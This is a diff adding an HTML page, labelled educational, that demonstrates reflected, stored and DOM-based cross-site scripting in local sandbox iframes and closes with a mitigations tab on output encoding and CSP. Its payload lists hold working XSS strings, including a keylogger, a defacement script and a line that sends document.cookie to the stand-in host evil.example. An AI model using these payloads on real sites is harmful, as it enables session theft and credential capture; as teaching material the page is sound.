@@ -1,0 +1,915 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>XSS Test Harness — Educational Use Only</title>
+<style>
+  :root {
+    --bg: #0d1117;
+    --surface: #161b22;
+    --surface2: #21262d;
+    --border: #30363d;
+    --green: #3fb950;
+    --green-dim: #238636;
+    --red: #f85149;
+    --yellow: #d29922;
+    --blue: #58a6ff;
+    --purple: #bc8cff;
+    --text: #e6edf3;
+    --text-muted: #8b949e;
+    --mono: 'Fira Code', 'Cascadia Code', 'Consolas', monospace;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    font-size: 14px;
+    line-height: 1.6;
+    padding: 0 0 60px;
+  }
+
+  /* ── Header ── */
+  header {
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    padding: 16px 24px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+  .skull { font-size: 24px; }
+  header h1 { font-size: 18px; font-weight: 600; color: var(--text); }
+  header .badge {
+    background: #3d1a1a;
+    color: var(--red);
+    border: 1px solid #6e2020;
+    border-radius: 20px;
+    font-size: 11px;
+    font-weight: 600;
+    padding: 2px 10px;
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+  }
+
+  /* ── Layout ── */
+  .container { max-width: 1100px; margin: 0 auto; padding: 24px; }
+
+  .alert-box {
+    background: #1c1005;
+    border: 1px solid var(--yellow);
+    border-left: 4px solid var(--yellow);
+    border-radius: 6px;
+    padding: 12px 16px;
+    margin-bottom: 24px;
+    color: #e3b341;
+    font-size: 13px;
+  }
+
+  /* ── Cards ── */
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    margin-bottom: 20px;
+  }
+  .card-header {
+    padding: 12px 16px;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-weight: 600;
+    font-size: 13px;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+  .card-header .dot {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: var(--green);
+  }
+  .card-header .dot.red { background: var(--red); }
+  .card-header .dot.blue { background: var(--blue); }
+  .card-body { padding: 16px; }
+
+  /* ── Two-column grid ── */
+  .grid-2 {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 20px;
+  }
+  @media (max-width: 700px) { .grid-2 { grid-template-columns: 1fr; } }
+
+  /* ── Payload list ── */
+  .payload-list { display: flex; flex-direction: column; gap: 8px; }
+  .payload-item {
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 10px 12px;
+    cursor: pointer;
+    transition: border-color 0.15s;
+  }
+  .payload-item:hover { border-color: var(--blue); }
+  .payload-item .label {
+    font-size: 11px;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    margin-bottom: 4px;
+  }
+  .payload-item code {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--red);
+    word-break: break-all;
+  }
+  .payload-item .desc {
+    font-size: 11px;
+    color: var(--text-muted);
+    margin-top: 4px;
+  }
+
+  /* ── Config panel ── */
+  .form-row {
+    display: flex;
+    flex-direction: column;
+    gap: 4px;
+    margin-bottom: 12px;
+  }
+  label { font-size: 12px; color: var(--text-muted); }
+  input[type="text"], textarea, select {
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 12px;
+    padding: 8px 10px;
+    width: 100%;
+    outline: none;
+    transition: border-color 0.15s;
+    resize: vertical;
+  }
+  input[type="text"]:focus,
+  textarea:focus,
+  select:focus { border-color: var(--blue); }
+
+  /* ── Buttons ── */
+  .btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 8px 16px;
+    border-radius: 6px;
+    border: 1px solid;
+    font-size: 13px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: opacity 0.15s;
+    text-decoration: none;
+  }
+  .btn:hover { opacity: 0.85; }
+  .btn-green {
+    background: var(--green-dim);
+    border-color: var(--green);
+    color: #fff;
+  }
+  .btn-blue {
+    background: #0d2a4e;
+    border-color: var(--blue);
+    color: var(--blue);
+  }
+  .btn-red {
+    background: #3d1010;
+    border-color: var(--red);
+    color: var(--red);
+  }
+  .btn-row { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 12px; }
+
+  /* ── Output / preview ── */
+  .output-box {
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 12px;
+    font-family: var(--mono);
+    font-size: 12px;
+    min-height: 80px;
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+  .output-box.url-display { color: var(--blue); }
+
+  /* ── Sandbox iframe ── */
+  #sandbox-frame {
+    width: 100%;
+    height: 260px;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    background: #fff;
+  }
+
+  /* ── Attack log ── */
+  #attack-log {
+    background: #000;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 12px;
+    font-family: var(--mono);
+    font-size: 12px;
+    height: 160px;
+    overflow-y: auto;
+  }
+  .log-entry { margin-bottom: 4px; }
+  .log-entry .ts { color: var(--text-muted); }
+  .log-entry .tag-atk { color: var(--red); }
+  .log-entry .tag-ok  { color: var(--green); }
+  .log-entry .tag-info { color: var(--blue); }
+  .log-entry .msg { color: var(--text); }
+
+  /* ── Section header ── */
+  .section-label {
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    color: var(--text-muted);
+    margin-bottom: 12px;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 6px;
+  }
+
+  /* ── Tabs ── */
+  .tabs { display: flex; gap: 0; border-bottom: 1px solid var(--border); margin-bottom: 16px; }
+  .tab {
+    padding: 8px 16px;
+    font-size: 13px;
+    cursor: pointer;
+    color: var(--text-muted);
+    border-bottom: 2px solid transparent;
+    transition: color 0.15s;
+    margin-bottom: -1px;
+  }
+  .tab.active { color: var(--blue); border-bottom-color: var(--blue); }
+
+  .tab-content { display: none; }
+  .tab-content.active { display: block; }
+
+  /* ── Mitigation comparison ── */
+  .compare-row {
+    display: grid;
+    grid-template-columns: auto 1fr 1fr;
+    gap: 8px 12px;
+    align-items: center;
+    font-size: 13px;
+    margin-bottom: 10px;
+  }
+  .compare-row .check { color: var(--green); font-size: 15px; }
+  .compare-row .cross { color: var(--red); font-size: 15px; }
+  .compare-row .technique { color: var(--text-muted); font-size: 12px; }
+  .compare-col-header { font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-muted); text-align: center; }
+</style>
+</head>
+<body>
+
+<header>
+  <span class="skull">💀</span>
+  <h1>XSS Attack Test Harness</h1>
+  <span class="badge">Educational Only</span>
+</header>
+
+<div class="container">
+
+  <div class="alert-box">
+    ⚠️  This tool is for classroom demonstration of Cross-Site Scripting (XSS) vulnerabilities only.
+    All attacks target a local sandbox. Never use these techniques against systems you do not own.
+  </div>
+
+  <!-- TABS -->
+  <div class="tabs">
+    <div class="tab active" onclick="switchTab('reflected')">Reflected XSS</div>
+    <div class="tab" onclick="switchTab('stored')">Stored XSS</div>
+    <div class="tab" onclick="switchTab('dom')">DOM-Based XSS</div>
+    <div class="tab" onclick="switchTab('mitigations')">Mitigations</div>
+  </div>
+
+  <!-- ══════════════════════════ REFLECTED XSS TAB ══════════════════════════ -->
+  <div id="tab-reflected" class="tab-content active">
+    <div class="grid-2">
+
+      <!-- Left: Payload Library -->
+      <div>
+        <div class="card">
+          <div class="card-header"><span class="dot red"></span>Payload Library — Reflected</div>
+          <div class="card-body">
+            <p class="section-label">Click a payload to load it into the builder</p>
+            <div class="payload-list" id="reflected-payloads">
+              <!-- populated by JS -->
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Right: Attack Builder & Sandbox -->
+      <div>
+        <div class="card">
+          <div class="card-header"><span class="dot blue"></span>Attack Builder</div>
+          <div class="card-body">
+
+            <div class="form-row">
+              <label>Target URL (simulated)</label>
+              <input type="text" id="target-url" value="http://localhost:8080/vulnerable/comments">
+            </div>
+
+            <div class="form-row">
+              <label>Vulnerable parameter</label>
+              <input type="text" id="param-name" value="search">
+            </div>
+
+            <div class="form-row">
+              <label>XSS Payload</label>
+              <textarea id="payload-input" rows="3"><script>alert(document.cookie)</script></textarea>
+            </div>
+
+            <div class="form-row">
+              <label>Generated Attack URL</label>
+              <div class="output-box url-display" id="attack-url-output">—</div>
+            </div>
+
+            <div class="form-row" style="margin-top:12px;">
+              <label style="color:var(--yellow);">Simulated victim cookies (educational — injected before payload runs)</label>
+              <div style="display:flex;gap:8px;flex-wrap:wrap;">
+                <div style="flex:1;min-width:140px;">
+                  <label>JSESSIONID</label>
+                  <input type="text" id="cookie-session" value="aB3xZ9qR2mN7vL4k">
+                </div>
+                <div style="flex:1;min-width:120px;">
+                  <label>user</label>
+                  <input type="text" id="cookie-user" value="alice">
+                </div>
+              </div>
+            </div>
+            <div class="btn-row">
+              <button class="btn btn-green" onclick="buildAttackUrl()">⚙ Build URL</button>
+              <button class="btn btn-red"   onclick="launchSandbox()">▶ Run in Sandbox</button>
+              <button class="btn btn-blue"  onclick="copyUrl()">⎘ Copy URL</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header"><span class="dot red"></span>Sandbox Preview</div>
+          <div class="card-body" style="padding: 0;">
+            <iframe id="sandbox-frame" srcdoc="<p style='padding:16px;color:#888;font-family:sans-serif'>Click &ldquo;Run in Sandbox&rdquo; to preview the vulnerable page output.</p>"></iframe>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Attack Log -->
+    <div class="card">
+      <div class="card-header"><span class="dot"></span>Simulated Attack Log</div>
+      <div class="card-body" style="padding: 0;">
+        <div id="attack-log">
+          <div class="log-entry"><span class="ts">[00:00:00]</span> <span class="tag-info">[INFO]</span> <span class="msg">Harness ready. No attacks executed yet.</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════ STORED XSS TAB ══════════════════════════ -->
+  <div id="tab-stored" class="tab-content">
+    <div class="grid-2">
+      <div>
+        <div class="card">
+          <div class="card-header"><span class="dot red"></span>Payload Library — Stored</div>
+          <div class="card-body">
+            <div class="payload-list" id="stored-payloads">
+              <!-- populated by JS -->
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div>
+        <div class="card">
+          <div class="card-header"><span class="dot blue"></span>Stored XSS Simulator</div>
+          <div class="card-body">
+            <p style="font-size:12px; color:var(--text-muted); margin-bottom:12px;">
+              Simulates posting a malicious comment to the vulnerable servlet's comment store.
+              The payload is persisted and executed when any visitor loads the page.
+            </p>
+
+            <div class="form-row">
+              <label>Attacker name</label>
+              <input type="text" id="stored-name" value="Attacker">
+            </div>
+            <div class="form-row">
+              <label>Malicious comment (XSS payload)</label>
+              <textarea id="stored-comment" rows="3"><script>alert('Stored XSS! Cookie: '+document.cookie)</script></textarea>
+            </div>
+
+            <div class="btn-row">
+              <button class="btn btn-red" onclick="runStoredDemo()">▶ Simulate Victim Visit</button>
+              <button class="btn btn-blue" onclick="clearStoredComments()">✕ Clear Comments</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header"><span class="dot red"></span>Victim's Browser (Sandbox)</div>
+          <div class="card-body" style="padding:0">
+            <iframe id="stored-sandbox" style="width:100%;height:260px;border:none;background:#fff;"
+              srcdoc="<p style='padding:16px;color:#888;font-family:sans-serif'>Simulated victim view will appear here.</p>"></iframe>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════ DOM XSS TAB ══════════════════════════ -->
+  <div id="tab-dom" class="tab-content">
+    <div class="grid-2">
+      <div>
+        <div class="card">
+          <div class="card-header"><span class="dot red"></span>DOM XSS — How it Differs</div>
+          <div class="card-body">
+            <p style="font-size:13px;color:var(--text-muted);margin-bottom:14px;">
+              DOM-based XSS never reaches the server. Client-side JavaScript reads from
+              <code style="color:var(--red)">location.hash</code>, <code style="color:var(--red)">location.search</code>,
+              or <code style="color:var(--red)">document.referrer</code> and writes it unsafely to the DOM.
+            </p>
+
+            <div class="payload-list" id="dom-payloads">
+              <!-- populated by JS -->
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div>
+        <div class="card">
+          <div class="card-header"><span class="dot blue"></span>DOM XSS Sandbox</div>
+          <div class="card-body">
+            <p style="font-size:12px;color:var(--text-muted);margin-bottom:12px;">
+              The sandbox below simulates a vulnerable client-side page that does:
+              <code style="color:var(--red)">document.getElementById('output').innerHTML = location.hash.slice(1)</code>
+            </p>
+            <p style="font-size:12px;color:var(--text-muted);margin-bottom:12px;">
+              Click a payload above to run it, or type a hash fragment below.
+            </p>
+            <div class="form-row">
+              <label>Custom hash fragment (without #)</label>
+              <input type="text" id="dom-payload-input" value="<img src=x onerror=alert('DOM XSS')>">
+            </div>
+            <div class="btn-row">
+              <button class="btn btn-red" onclick="runDomXss('#'+document.getElementById('dom-payload-input').value)">▶ Run</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header"><span class="dot red"></span>DOM Sandbox</div>
+          <div class="card-body" style="padding:0">
+            <iframe id="dom-sandbox" style="width:100%;height:220px;border:none;background:#fff;"
+              srcdoc="<p style='padding:16px;color:#888;font-family:sans-serif'>DOM XSS demo will render here.</p>"></iframe>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════ MITIGATIONS TAB ══════════════════════════ -->
+  <div id="tab-mitigations" class="tab-content">
+    <div class="grid-2">
+
+      <div>
+        <div class="card">
+          <div class="card-header"><span class="dot"></span>Vulnerable vs Secure — Side by Side</div>
+          <div class="card-body">
+
+            <p class="section-label">Mitigation coverage</p>
+
+            <div class="compare-row">
+              <div></div>
+              <div class="compare-col-header">Vulnerable</div>
+              <div class="compare-col-header">Secure</div>
+            </div>
+
+            <div class="compare-row">
+              <div class="technique">Output encoding (HTML entities)</div>
+              <div class="cross" style="text-align:center">✗</div>
+              <div class="check" style="text-align:center">✓</div>
+            </div>
+            <div class="compare-row">
+              <div class="technique">Content-Security-Policy header</div>
+              <div class="cross" style="text-align:center">✗</div>
+              <div class="check" style="text-align:center">✓</div>
+            </div>
+            <div class="compare-row">
+              <div class="technique">HttpOnly cookie flag</div>
+              <div class="cross" style="text-align:center">✗</div>
+              <div class="check" style="text-align:center">✓</div>
+            </div>
+            <div class="compare-row">
+              <div class="technique">Input validation (type/length)</div>
+              <div class="cross" style="text-align:center">✗</div>
+              <div class="check" style="text-align:center">✓</div>
+            </div>
+            <div class="compare-row">
+              <div class="technique">Templating engine auto-escape</div>
+              <div class="cross" style="text-align:center">✗</div>
+              <div class="check" style="text-align:center">✓</div>
+            </div>
+
+            <hr style="border:none;border-top:1px solid var(--border);margin:16px 0;">
+
+            <p class="section-label">The htmlEncode fix — Java</p>
+            <div class="output-box" style="font-size:11px; color: #79c0ff;">
+// VULNERABLE — raw output
+out.println("Search: " + searchTerm);
+
+// SECURE — HTML-encode before output
+String safe = htmlEncode(searchTerm);
+out.println("Search: " + safe);
+
+// The encoder
+private static String htmlEncode(String s) {
+  return s
+    .replace("&",  "&amp;")
+    .replace("<",  "&lt;")
+    .replace(">",  "&gt;")
+    .replace("\"", "&quot;")
+    .replace("'",  "&#x27;");
+}
+
+// Better: use a library
+// OWASP Java Encoder:
+// Encode.forHtml(searchTerm)
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div>
+        <div class="card">
+          <div class="card-header"><span class="dot"></span>Live Encoding Demo</div>
+          <div class="card-body">
+            <p style="font-size:12px;color:var(--text-muted);margin-bottom:12px;">
+              Type a payload below to see what the browser would receive before and after encoding.
+            </p>
+            <div class="form-row">
+              <label>Raw payload (attacker input)</label>
+              <textarea id="encode-input" rows="2" oninput="updateEncodeDemo()"><script>alert('xss')</script></textarea>
+            </div>
+            <div class="form-row">
+              <label>HTML-encoded output (safe to render)</label>
+              <div class="output-box" id="encode-output" style="color: var(--green); min-height:50px;"></div>
+            </div>
+            <div class="form-row">
+              <label>Browser renders it as literal text ✓</label>
+              <div id="encode-preview" style="background:var(--surface2); border:1px solid var(--border); border-radius:6px; padding:10px; font-size:13px; min-height:36px;"></div>
+            </div>
+
+            <hr style="border:none;border-top:1px solid var(--border);margin:16px 0;">
+
+            <p class="section-label">Content-Security-Policy example</p>
+            <div class="output-box" style="font-size:11px;color:#79c0ff;">
+// Servlet header
+response.setHeader(
+  "Content-Security-Policy",
+  "default-src 'self'; " +
+  "script-src 'self'; " +
+  "object-src 'none';"
+);
+
+// This blocks inline &lt;script&gt; and
+// javascript: URIs even if encoding fails.
+// Defence-in-depth — not a substitute
+// for output encoding.
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+</div><!-- /container -->
+
+<script>
+// ── Payload data (defined in JS to avoid HTML attribute quoting issues) ────────
+
+const REFLECTED_PAYLOADS = [
+  {
+    label: 'Classic alert — cookie theft simulation',
+    code:  '<script>alert(document.cookie)<\/script>',
+    payload: '<script>alert(document.cookie)<\/script>',
+    param: 'search',
+    desc: 'Most basic XSS — shows that script execution is possible. In a real attack, document.cookie would be exfiltrated to an attacker server.'
+  },
+  {
+    label: 'IMG onerror — tag attribute injection',
+    code:  '<img src=x onerror=alert("XSS via img tag")>',
+    payload: '<img src=x onerror=alert("XSS&nbsp;via&nbsp;img&nbsp;tag")>',
+    param: 'search',
+    desc: 'No &lt;script&gt; tag needed. Bypasses naive filters that only block &lt;script&gt;. The onerror handler fires because src=x fails to load.'
+  },
+  {
+    label: 'SVG onload — vector graphics injection',
+    code:  '<svg onload=alert("SVG XSS")>',
+    payload: '<svg onload=alert("SVG&nbsp;XSS")>',
+    param: 'search',
+    desc: 'SVG elements execute in an HTML context. Often overlooked by input filters that target only &lt;script&gt;.'
+  },
+  {
+    label: 'Attribute breakout — quote escaping',
+    code:  '"><script>alert("Attr breakout")<\/script>',
+    payload: '"><script>alert("Attr breakout")<\/script>',
+    param: 'search',
+    desc: 'Closes an HTML attribute and tag, then injects a script. Used when input is reflected inside an attribute value like value="...".'
+  },
+  {
+    label: 'Body onload — event handler injection',
+    code:  '<body onload=alert("body onload")>',
+    payload: '<body onload=alert("body&nbsp;onload")>',
+    param: 'search',
+    desc: "Injects a second body element with an onload handler. Some browsers execute it, some don't — illustrates browser-specific behaviour."
+  },
+  {
+    label: 'javascript: URI — link injection',
+    code:  '<a href=javascript:alert("href injection")>Click me</a>',
+    payload: '<a href=javascript:alert("href&nbsp;injection")>Click me</a>',
+    param: 'search',
+    desc: 'Injects a clickable link with a javascript: URI. Executes when the user clicks — useful for phishing flows.'
+  }
+];
+
+const STORED_PAYLOADS = [
+  {
+    label: 'Cookie harvester via stored script',
+    code:  'name: Attacker | comment: &lt;script&gt;alert(document.cookie)&lt;/script&gt;',
+    name:    'Attacker',
+    payload: '<script>alert("Stored XSS! Cookie: " + document.cookie)<\/script>',
+    desc: "Stored in the database. Every subsequent visitor executes this script. Classic persistent XSS — the victim doesn't need to click a malicious link."
+  },
+  {
+    label: 'Silent cookie exfiltration (no alert)',
+    code:  'comment: &lt;img src=x onerror="fetch(evil.example/steal?c="+cookie)"&gt;',
+    name:    'Hacker',
+    payload: '<img src=x onerror="fetch(\'https://evil.example/steal?c=\'+document.cookie)">',
+    desc: "A stealthy attack — no popup. The browser silently fetches the attacker URL with the cookie appended. Check the browser Network tab to see the request."
+  },
+  {
+    label: 'Page defacement',
+    code:  'comment: &lt;script&gt;document.body.innerHTML=...&lt;/script&gt;',
+    name:    'Bot',
+    payload: '<script>document.body.innerHTML="<h1 style=color:red>You have been hacked</h1>"<\/script>',
+    desc: 'Overwrites the entire page DOM. Often used to damage reputation or demonstrate impact. Less subtle than credential theft.'
+  },
+  {
+    label: 'Keylogger injection',
+    code:  'comment: &lt;script&gt;document.onkeydown=...&lt;/script&gt;',
+    name:    'Spy',
+    payload: '<script>var k=[];document.onkeydown=function(e){k.push(e.key);console.log("Keylogger: "+k.join(","))}<\/script>',
+    desc: 'Registers a keydown listener. Every keystroke is captured — including passwords typed while the script is loaded. Check the browser console.'
+  }
+];
+
+const DOM_PAYLOADS = [
+  {
+    label: 'Hash-based injection via location.hash',
+    code:  '#&lt;img src=x onerror=alert("DOM XSS via hash")&gt;',
+    payload: '#<img src=x onerror=alert("DOM&nbsp;XSS&nbsp;via&nbsp;hash")>',
+    desc: 'The hash never leaves the browser — invisible to server logs and WAFs. Client JS writes it to innerHTML unsafely.'
+  },
+  {
+    label: 'SVG in hash',
+    code:  '#&lt;svg onload=alert("SVG in hash")&gt;',
+    payload: '#<svg onload=alert("SVG&nbsp;in&nbsp;hash")>',
+    desc: 'Variant using SVG element injection through the fragment identifier.'
+  },
+  {
+    label: 'javascript: URI via hash',
+    code:  '#javascript:alert("js URI")',
+    payload: '#javascript:alert("js URI")',
+    desc: 'If the page uses location.hash as an href, a javascript: URI executes on click.'
+  }
+];
+
+function buildPayloadList(containerId, payloads, clickFn) {
+  const container = document.getElementById(containerId);
+  if (!container) return;
+  container.innerHTML = '';
+  payloads.forEach(function(p, i) {
+    var div = document.createElement('div');
+    div.className = 'payload-item';
+    div.innerHTML = '<div class="label">' + p.label + '</div>'
+      + '<code>' + p.code + '</code>'
+      + '<div class="desc">' + p.desc + '</div>';
+    div.addEventListener('click', function() { clickFn(p); });
+    container.appendChild(div);
+  });
+}
+
+// ── Utility ─────────────────────────────────────────────────────────────────
+
+function resetIframe(id) {
+  // Replace the iframe element entirely so the old document
+  // (and any pending alerts/scripts) is fully destroyed.
+  var old = document.getElementById(id);
+  var fresh = document.createElement('iframe');
+  fresh.id = id;
+  fresh.style.cssText = old.style.cssText;
+  old.parentNode.replaceChild(fresh, old);
+  return fresh;
+}
+
+function htmlEncode(s) {
+  return s
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#x27;");
+}
+
+function ts() {
+  return new Date().toTimeString().slice(0,8);
+}
+
+function log(tag, cls, msg) {
+  const el = document.getElementById('attack-log');
+  el.innerHTML += `<div class="log-entry"><span class="ts">[${ts()}]</span> <span class="${cls}">[${tag}]</span> <span class="msg">${msg}</span></div>`;
+  el.scrollTop = el.scrollHeight;
+}
+
+// ── Tabs ────────────────────────────────────────────────────────────────────
+
+function switchTab(name) {
+  document.querySelectorAll('.tab').forEach((t,i) => t.classList.remove('active'));
+  document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+  document.getElementById('tab-' + name).classList.add('active');
+  const tabs = ['reflected','stored','dom','mitigations'];
+  document.querySelectorAll('.tab')[tabs.indexOf(name)].classList.add('active');
+}
+
+// ── Reflected XSS ───────────────────────────────────────────────────────────
+
+function setPayload(payload, param) {
+  document.getElementById('payload-input').value = payload;
+  document.getElementById('param-name').value = param;
+  buildAttackUrl();
+}
+
+function buildAttackUrl() {
+  const base  = document.getElementById('target-url').value.trim();
+  const param = document.getElementById('param-name').value.trim();
+  const payload = document.getElementById('payload-input').value;
+  const url = `${base}?${param}=${encodeURIComponent(payload)}`;
+  document.getElementById('attack-url-output').textContent = url;
+  log('BUILD', 'tag-info', `Attack URL built: ...?${param}=${htmlEncode(encodeURIComponent(payload).slice(0,60))}...`);
+}
+
+function getFakeCookieScript() {
+  const session = document.getElementById('cookie-session').value;
+  const user    = document.getElementById('cookie-user').value;
+  // Sets cookies inside the iframe document before the payload runs
+  return `document.cookie='JSESSIONID=${session}; path=/';`
+       + `document.cookie='user=${user}; path=/';`
+       + `document.cookie='role=admin; path=/';`;
+}
+
+function launchSandbox() {
+  const payload    = document.getElementById('payload-input').value;
+  const param      = document.getElementById('param-name').value;
+  const cookieJs   = getFakeCookieScript();
+  const session    = document.getElementById('cookie-session').value;
+  const user       = document.getElementById('cookie-user').value;
+  const fakeCookieStr = `JSESSIONID=${session}; user=${user}; role=admin`;
+  const safePayload = payload.replace(/\\/g, '\\\\').replace(/`/g, '\\`');
+  const vulnHtml = '<!DOCTYPE html><html><head><title>Vulnerable Page</title></head><body>'
+    + '<script>' + cookieJs + '<\/script>'
+    + '<h2 style="font-family:sans-serif">Community Comments (Vulnerable)</h2><hr>'
+    + '<p style="font-family:sans-serif">Showing results for: ' + safePayload + '</p>'
+    + '<p style="font-family:sans-serif;color:#888;font-size:12px;">'
+    + '⚠ In a real attack, the script above executes in the victim\'s browser session.'
+    + '</p></body></html>';
+  var frame = resetIframe('sandbox-frame');
+  frame.srcdoc = vulnHtml;
+  log('ATTACK', 'tag-atk', 'Reflected XSS payload injected into "' + param + '" parameter');
+  log('COOKIE', 'tag-atk', 'Simulated victim cookies set: ' + fakeCookieStr);
+  log('EXEC',   'tag-atk', 'Payload: ' + htmlEncode(payload.slice(0,80)));
+}
+
+function copyUrl() {
+  const url = document.getElementById('attack-url-output').textContent;
+  navigator.clipboard.writeText(url).then(() => log('COPY', 'tag-ok', 'Attack URL copied to clipboard'));
+}
+
+// ── Stored XSS ──────────────────────────────────────────────────────────────
+
+var storedComments = [];
+
+function setStoredPayload(name, comment) {
+  document.getElementById('stored-name').value = name;
+  document.getElementById('stored-comment').value = comment;
+}
+
+function runStoredDemo() {
+  const name    = document.getElementById('stored-name').value;
+  const comment = document.getElementById('stored-comment').value;
+
+  // "Post" malicious comment
+  storedComments.push({ name, comment });
+
+  // Render victim page with all stored comments (including malicious one)
+  let commentHtml = storedComments.map(c => {
+    const safeName    = c.name.replace(/\\/g, '\\\\').replace(/`/g, '\\`');
+    const safeComment = c.comment.replace(/\\/g, '\\\\').replace(/`/g, '\\`');
+    return '<div style="border:1px solid #ccc;margin:8px;padding:8px;font-family:sans-serif">'
+      + '<strong>' + safeName + '</strong>: ' + safeComment
+      + '</div>';
+  }).join('');
+
+  const cookieJs = getFakeCookieScript();
+  const victimHtml = '<!DOCTYPE html><html><head><title>Victim View</title></head><body>'
+    + '<script>' + cookieJs + '<\/script>'
+    + '<h2 style="font-family:sans-serif">Community Comments</h2><hr>'
+    + commentHtml
+    + '<p style="font-family:sans-serif;color:#888;font-size:12px;margin-top:12px;">'
+    + '⚠ Stored payload executes for every visitor — no malicious URL needed.'
+    + '</p></body></html>';
+
+  var sframe = resetIframe('stored-sandbox');
+  sframe.srcdoc = victimHtml;
+  log('STORE', 'tag-atk', `Malicious comment stored: name="${htmlEncode(name)}", payload="${htmlEncode(comment.slice(0,60))}..."`);
+  log('EXEC', 'tag-atk', 'Victim loaded the page — stored script executed in their session');
+}
+
+function clearStoredComments() {
+  storedComments = [];
+  var cf = resetIframe('stored-sandbox');
+  cf.srcdoc = '<p style="padding:16px;color:#888;font-family:sans-serif">Comments cleared.</p>';
+  log('CLEAR', 'tag-ok', 'Stored comments cleared');
+}
+
+// ── DOM XSS ─────────────────────────────────────────────────────────────────
+
+function runDomXss(fragment) {
+  // The hash fragment goes after # — the vulnerable page reads location.hash
+  const domVulnPage = `<!DOCTYPE html><html><head><title>DOM XSS Demo</title></head><body>
+<h2 style="font-family:sans-serif">Search Results</h2>
+<div id="output" style="font-family:sans-serif"></div>
+<script>
+  // VULNERABLE: reads hash and writes to innerHTML without encoding
+  var hash = decodeURIComponent("${encodeURIComponent(fragment.replace('#',''))}");
+  document.getElementById('output').innerHTML = hash;
+<\/script>
+<p style="font-family:sans-serif;color:#888;font-size:12px;margin-top:12px;">
+  ⚠ This payload never touched the server — invisible to server-side WAFs and logs.
+</p>
+</body></html>`;
+
+  var dframe = resetIframe('dom-sandbox');
+  dframe.srcdoc = domVulnPage;
+  log('DOM-XSS', 'tag-atk', `Hash-based payload injected: ${htmlEncode(fragment.slice(0,80))}`);
+}
+
+// ── Encoding Demo ────────────────────────────────────────────────────────────
+
+function updateEncodeDemo() {
+  const raw = document.getElementById('encode-input').value;
+  const encoded = htmlEncode(raw);
+  document.getElementById('encode-output').textContent = encoded;
+  // Show how the browser renders the safe version (as literal text, not HTML)
+  document.getElementById('encode-preview').textContent = raw;
+}
+
+// Init
+buildPayloadList('reflected-payloads', REFLECTED_PAYLOADS, function(p) {
+  document.getElementById('payload-input').value = p.payload;
+  document.getElementById('param-name').value = p.param;
+  buildAttackUrl();
+});
+
+buildPayloadList('stored-payloads', STORED_PAYLOADS, function(p) {
+  document.getElementById('stored-name').value = p.name;
+  document.getElementById('stored-comment').value = p.payload;
+});
+
+buildPayloadList('dom-payloads', DOM_PAYLOADS, function(p) {
+  document.getElementById('dom-payload-input').value = p.payload.replace(/^#/, '');
+  runDomXss(p.payload);
+});
+
+buildAttackUrl();
+updateEncodeDemo();
+</script>
+
+</body>
+</html>
